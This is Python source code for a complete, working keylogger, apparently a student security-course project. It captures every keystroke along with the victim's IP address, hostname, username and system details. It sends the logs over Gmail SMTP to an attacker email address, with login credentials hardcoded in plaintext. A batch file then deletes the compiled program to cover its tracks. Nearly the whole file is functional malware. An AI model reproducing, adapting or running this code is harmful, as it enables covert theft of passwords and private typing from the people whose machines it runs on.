from pynput import keyboard
import time
import smtplib
from os import remove, path
import subprocess
from sys import argv
import threading
import Queue
import socket
import getpass
import platform
from time import localtime, strftime,sleep
#Destination Email 
DEST_EMAIL = "keylogsenderUIUC460@gmail.com" 
#Emails will be sent from this email account 
SRC_EMAIL = "keylogsenderUIUC460" 
SRC_PWD =  "qazwsxedcrfv"

#Emails will be sent out after this many characters have been collected (note "[CTRL]" is 6 chars)
DATA_BUFFER_SIZE = 500 


#Exit program by pressing these buttons at the same time
#You can customize this by adding :
#"Key.Special_key" (Refer to the dictionary in filterKeys()
# or 
#"u'LETTER'" (notice the use of single quotation marks) 
exit_keys = { 
    "Key.ctrl_l": False,
    "Key.shift_r": False,
    "Key.space": False,
}


#If this is True then keystrokes will be logged to file instead of email
local = False 
#DO NOT TOCUH: Internal Variables   
end_program= False
data = ""
q = Queue.Queue()
holdDowns = ['Key.ctrl_l', 'Key.ctrl_r',
             'Key.shift', 'Key.shift_r',
             'Key.alt_l', 'Key.alt_r']

def filterKeys(letter, released = False):
    replacements = {
        'Key.space': ' ',
        'Key.ctrl_l': '[CTRL_L]',
        'Key.ctrl_r': '[CTRL_R]',
        'Key.shift': '[SHIFT_L]',
        'Key.shift_r': '[SHIFT_R]',
        'Key.alt_l': '[ALT_L]',
        'Key.alt_r': '[ALT_R]',
        'Key.caps_lock': '[CAPS_LOCK]',
        'Key.backspace': '[BACKSPACE]',
        'Key.enter': '[ENTER]\n',
        'Key.esc': '[ESC]',
        'Key.tab': '[TAB]',
        'Key.delete': '[DEL]',
        'Key.end': '[END]',
        'Key.home': '[HOME]',
        'Key.ins': '[INS]',
        'Key.page_up': '[PAGEUP]',
        'Key.page_down': '[PAGEDOWN]',
        'Key.cmd': '[WINDOWSKEY]',
        'Key.menu': '[MENU]',
        'Key.up': '[UP]',
        'Key.down': '[DOWN]',
        'Key.left': '[LEFT]',
        'Key.right': '[RIGHT]',
        'Key.f1': '[F1]',
        'Key.f2': '[F2]',
        'Key.f3': '[F3]',
        'Key.f4': '[F4]',
        'Key.f5': '[F5]',
        'Key.f6': '[F6]',
        'Key.f7': '[F7]',
        'Key.f8': '[F8]',
        'Key.f9': '[F9]',
        'Key.f10': '[F10]',
        'Key.f11': '[F11]',
        'Key.f12': '[F12]',
                
    }
    filtered = replacements.get(letter,letter)
    if(letter in holdDowns and released == True):
        return filtered[:-1]+" RELEASED]"
    return filtered
def serverSetup(): #retries every 60 second if fails
    global SRC_EMAIL, SRC_PWD, server, end_program
    try:
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(SRC_EMAIL, SRC_PWD)
    except Exception as e:
        print('Exception: '+str(e))
        print("Retrying...")
        sleep(60) 
        if(end_program == True):
            return False
        return serverSetup()
    return True

def send_data(msg, victimInfo):
    global local, server
    try:
        IP = victimInfo.get('IP')
        HostName = victimInfo.get('Hostname')
        UserName = victimInfo.get('Username')
        Machine = victimInfo.get('Machine')
        Time = strftime("%a, %d %b %Y %H:%M:%S",localtime())      
                
        #build message
        fullmsg =       ('\nLast Key Recorded:' + Time +
                        '\nSource IP: ' + str(IP) +
                        '\nHostName: ' + str(HostName) +
                        '\nUserName: ' + str(UserName) +
                        '\n\n---System Info:---- \n' + str(Machine) +
                        '\n\n---Message---\n' + str(msg))
    
        print('\n----------------- \nData:' + fullmsg+'\n----------\n')
        
        if(local):
            global f
            print('sending data through LOG FILE')
            f.write('{0}'.format(fullmsg))  
        else:
            global SRC_EMAIL, DEST_EMAIL
            print('sending data through EMAIL')
            server.sendmail(SRC_EMAIL, DEST_EMAIL, fullmsg)
        print("sending complete")
    except smtplib.SMTPServerDisconnected:
            print("Exception: Server disconnected. Retrying...")
            if(serverSetup() == False): #program exited
                return
            send_data(msg, victimInfo)
    except Exception as e:
        print('Exception: ' + str(e))
def recordKey(key, release=False):
        global data
        try:
            data += str(key.char)
        except AttributeError:
            data += filterKeys(str(key), release)
            print(filterKeys(str(key), release))
        except Exception as e:
            print('Exception: '+str(e))
        finally:
            if(len(data) > DATA_BUFFER_SIZE):
                q.put(data)
                data = ""
def prepare_end():
        global end_program
        end_program = True
        print("Ending Program...")
def on_press(key):
    print(key)
    global exit_keys
    if(str(key) in exit_keys):
        exit_keys[str(key)] = True 
        print(exit_keys)
        if(all(exit_key_held == True for exit_key_held in exit_keys.values())):
            prepare_end() 
            return False    
    recordKey(key)

def on_release(key, release=True):
    global data, end_program, ctrl_held
    if(str(key) in exit_keys):
        exit_keys[str(key)] = False
    try:
        if(str(key) in holdDowns):
            recordKey(key, release=True)
    
    except Exception as e:
        print('Exception: '+ str(e))

def run_keylogger():
    #collect events until released
    with keyboard.Listener(
            on_press=on_press,
            on_release=on_release
            ) as listener:

        try:
            listener.join()
        except Exception as e:
            print('Exception: '+str(e))

def capture_info():
        info = {}
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        victimIP = s.getsockname()[0]
        s.close()
        info['IP'] = victimIP

        info['Hostname'] = socket.gethostname()
        info['Username'] = getpass.getuser()
        info['Machine'] = (platform.machine() + '\n' +
                           platform.platform() + '\n' +
                           platform.system() + '\n' +
                           platform.processor())

        return info

def run_sender():
    global local
    victimInfo = capture_info() 
    if(local):
        global f
        f = open('keylog.txt', 'w')
        print("logging to file...")
    else:
        print("logging to email...")
        global server 
        serverSetup()
    
    while(end_program==False):
        try:
            msg = q.get(block = True, timeout = 5)
            send_data(msg, victimInfo)
        except:#queue empty 
            continue

    #send any remaining data
    global data
    send_data(data, victimInfo)

    if(local):
        f.close()
    else:
        server.quit()

def selfDelete():
    #create selfdelete file
    BATTXT = ("@ECHO OFF\n"
          +"SETLOCAL\n"
          +"TASKKILL /IM \"keylogger.exe\"\n"
          +"DEL \""+argv[0]+"\"\n"
          +"DEL \"%~f0\"") 
    d = open("del.bat", 'w')
    d.write(BATTXT)
    d.close()
    
    #run selfdelete file on exe, shell=True makes it run in background
    subprocess.Popen(path.dirname(path.abspath(__file__))+"\\del.bat", shell=True) 

def main():
    thread_keylogger = threading.Thread(target = run_keylogger)
    thread_sender = threading.Thread(target = run_sender)

    thread_keylogger.start()    
    thread_sender.start()   
    
    thread_keylogger.join()
    thread_sender.join()    
    if(argv[0][-2:]!="py"):#so we don't acidentally delete the python file when testing
        selfDelete()

if __name__== "__main__":
    main()
